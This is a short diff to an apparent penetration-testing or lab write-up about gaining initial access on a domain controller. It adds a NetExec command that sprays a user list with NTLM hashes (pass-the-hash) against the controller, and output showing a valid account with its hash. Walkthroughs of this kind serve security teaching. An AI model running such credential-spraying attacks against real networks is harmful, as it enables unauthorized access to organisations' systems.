@@ -577,7 +577,9 @@ I got access as the administrator
 
 # Initial access on the domain controller
 ```python
-
+nxc smb DC01.hsm.local -u users.txt -H hashes.txt --continue-on-success
 
 SMB         10.0.22.198     445    DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc
 ```
+This user has access on the domain controller
+
